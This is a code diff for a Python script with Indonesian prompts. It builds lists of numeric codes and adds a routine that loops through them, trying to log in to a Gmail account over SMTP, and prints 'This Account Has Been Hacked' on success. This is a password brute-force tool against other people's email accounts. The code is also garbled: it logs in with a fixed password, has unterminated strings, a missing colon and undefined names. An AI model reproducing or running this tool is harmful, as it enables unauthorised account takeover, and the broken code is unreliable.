@@ -6,7 +6,7 @@ for n in range(2000):
 
     nmbr = random.randint(1111111, 9999999)
     
-    sys.stdout = open('.txt', 'a')
+    sys.stdout = open('code.txt', 'a')
 
     print(nmbr)
 
@@ -76,16 +76,9 @@ def tik():
 	for o in titik:
 		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
-code = ["012345", "123456", "234561", "456783","567890", "678901", "6789012", "789012", "890123", "901234", "101234", "111234", "121234", "131234", "141234", "151234", "161234", "171234", "181234", "191234", "201234", "211234", "223456" "234567", "245678", "256789", "267890", "278901", "289012", "290123", "30123", "312345", "323456", "334567", "345678", "456789", "467890", "478901", "489012", "490123", "501234", "512345", "523456", "534567", "545678", "556789", "567890", "578901", "589012", "590123", "60123", "61234", "623456", "637890", "645678", "656789", "667890", "678901", "689012", "690123", "700987", "712938", "723847", "734756", "745610", "750192", "767089", "778019", "789012", "790129", "801928", "812837", "823948", "834756", "841028", "858945", "861382", "873838", "887596", "890128", "908912"]
-def code(kode):
-	        return kode[random.randint( 0, len(kode)-1)]
 
-
-nom = []
 id = []
-oks = []
-cpb = []
-
+code = []
 
 
 ##### LICENSE #####
@@ -154,17 +147,41 @@ def login():
 			login()
 
 def code():
+	i = 0
+	codem = raw_input('Email :')
+	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+	server.ehlo()
+	for code in code_list:
+		i = i + 1
+		print str(i) + '/' + str(len(code_list))
+		try:
+			server.login(codem, 'r')
+			system('clear')
+			main()
+			print '\n'
+			print '[+] This Account Has Been Hacked code :' + code + '
+			break
+		except smtplib.SMTPAuthenticationError as e:
+			error = str(e)
+		if error[14] == '<':
+			system('clear')
+			main()
+			print '[+] this account has been hacked, code :' + code + '
 
+			break
+		else:
+			print '[!] Code not found => ' + code
+			login()
 def main()
 	print '[1] mulai'
 	print '[2] keluar'
 	option = input('==>')
 	if option == 1:
-		code.txt = raw_input('path of passwords file :')
+		code.txt = raw_input('code file :')
 	else:
 		system('clear')
 		exit()
-	code_file = open(code.txt,'r')
+	code_file = open(&code.txt_,'r')
 	code_list = pass_file.readlines()
 
 if __name__=='__main__':
